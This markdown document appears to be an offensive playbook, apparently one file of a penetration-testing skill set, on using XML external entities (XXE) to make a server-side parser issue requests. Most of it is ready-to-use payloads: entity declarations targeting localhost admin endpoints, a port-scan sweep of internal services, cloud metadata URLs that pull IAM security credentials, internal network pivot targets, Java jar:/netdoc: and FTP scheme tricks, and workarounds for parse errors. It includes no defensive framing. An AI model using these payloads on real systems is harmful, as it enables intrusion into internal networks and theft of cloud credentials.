# SSRF via XXE — the parser as an HTTP client

## The core — external entity URL is a fetch

`<!ENTITY x SYSTEM "http://internal/...">` — the parser issues the
request itself. Response entity-expands into the doc → in-band SSRF.

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://localhost:8080/admin">]>
<r>&x;</r>
```

Response contains the internal endpoint's body if it echoes.

## The port-scan oracle — no echo needed

Even blind, entity resolution reveals reachability:

- `file:///etc/passwd` known-good → baseline error/response shape
- `http://127.0.0.1:PORT/` — each port → connection-refused vs
  timeout vs success produce *different* parser errors / timings

Sweep: `http://127.0.0.1:22/`, `:80`, `:3306`, `:6379`, `:8080`,
`:9200`, `:11211`, `:27017` — the open/closed error signature
fingerprints the internal service map — `web-ssrf` skill's full method.

## Cloud metadata — the jackpot

```xml
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY x SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!ENTITY x SYSTEM "http://100.100.100.200/latest/meta-data/">  — alibaba
<!ENTITY x SYSTEM "http://169.254.169.254/metadata/v1/">
```

GCE needs `Metadata-Flavor: Google` header — XXE can't set headers
usually → AWS-style IMDSv1 works where IMDSv2 token-blocks would fail
— try IMDSv1 first.

## Internal HTTP pivot — the router's own endpoints

```
http://127.0.0.1/          — loopback
http://localhost/
http://0.0.0.0/
http://[::1]/
http://127.0.0.1:port/…    — enumerate
http://10.0.0.x/ http://172.16.0.x/ http://192.168.0.x/ — RFC1918
http://internal/ http://backend/ http://admin/
http://kubernetes.default.svc/
```

The parser's URL fetch = `web-ssrf` skill's internal-pivot playbook,
driven by entities instead of a proxy.

## The `jar:`/`netdoc:` Java-specific schemes

Java URL handlers add:

```
jar:http://x!/resource        — jar-inside-zip fetch
netdoc:///path                — ≈ file://
jar:file:///tmp/x.jar!/file
```

`jar:` lets you fetch+extract a jar → file-read/write chain possible.

## The `ftp://` legacy schemes

`ftp://x/file` — Java/libxml2 support FTP — read remote files + works
as an OOB channel when HTTP egress is filtered but FTP isn't.

## The gopher fantasy — `gopher://`

libxml2 doesn't do gopher. Java's URL handler dropped gopher in
`java.net` modern builds. Some older `curl`-backed parsers (PHP)
accept `gopher://` — try, but expect low hit-rate.

## The response-in-body problem — XML-parse of HTML

`http://internal/` often returns HTML — substituting HTML into the doc
breaks well-formedness — the parser errors. Mitigations:

- `parse="text"` XInclude — text merge doesn't reparse
- CDATA-wrap composition — `cdata-wrapping.md`
- error-channel the URL — `error-based.md`

## The "internal endpoint returns XML" best case

Internal XML APIs (SOAP, RSS, WebDAV, `/?wsdl`) return valid XML —
entity-expands cleanly in-band → full SSRF read.

## The header problem — can't set auth/headers

Entities can't add request headers → endpoints needing auth/headers
are out (except URL-cred `http://user:pass@host/` — URL userinfo works).

## Chaining — XXE → SSRF → more XXE

Internal endpoint itself takes XML? The fetched XML's entities also
expand (transitively) — nested XXE through a first-hop parser is
theoretically possible; rare, log it as a lead.

## Falsifiers

- parser resolves entities but has no HTTP protocol handler (rare —
  most do) → only `file://`/`data:` paths remain
